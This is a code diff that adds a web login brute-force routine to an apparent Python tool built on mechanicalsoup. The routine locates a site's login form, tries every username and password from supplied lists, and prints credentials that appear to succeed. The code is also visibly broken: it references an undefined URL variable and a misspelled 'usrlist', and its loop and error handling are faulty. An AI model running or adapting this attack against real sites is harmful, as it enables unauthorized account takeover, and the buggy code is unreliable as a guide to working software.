@@ -36,3 +36,59 @@ def getLoginForm(objBrowser):
          break
       finally:
          return loginFields
+
+def createBrowser():
+   browser = mechanicalsoup.StatefulBrowser()
+   # SETTINGS HERE
+   return browser
+
+def check(url):
+   # Check if url has login form
+   browser = createBrowser()
+   try:
+      browser.open(URL)
+      # OPENING URL, DEBUG MSG HERE
+      result = core.getLoginForm(browser)
+   except Exception as error:
+      # PRINT ERROR HERE
+      result = False
+   finally:
+      browser.close()
+      return result
+
+def brute(url, userlist, passlist):
+   check_result = check(url)
+   if not check_result:
+      print("[x] Get login form error")
+   else:
+      formID, formUser, formPass = check_result
+
+   for username in usrlist:
+      for password in passlist:
+         # CREATE NEW BROWSER FOR EACH LOGIN. THIS IS A MUST DO
+         browser = createBrowser()
+         browser.open(URL)
+         # FILL FORM WITH VALUES
+         browser.select_form(nr = formID)
+         browser[formUser] = username
+         browser[formPass] = password
+         # SUBMIT 
+         browser.submit_selected()
+         # check condition here
+         try:
+            # HAS FORM
+            check_form = core.getLoginForm(browser)
+            if not check_form:
+               print("Found: [%s:%s]" %(username, password))
+               break
+         # except mechanicalsoup.utils.LinkNotFoundError:
+         #    # HAS NO FORM
+         #    # OLD CODE STRUCT, TEST MORE
+         #    print("Found: [%s:%s]" %(username, password))
+         #    break
+         except Exception as error:
+            # PRINT ERROR
+            pass
+         # ADD MORE CONDITION HERE
+         finally:
+            browser.close()
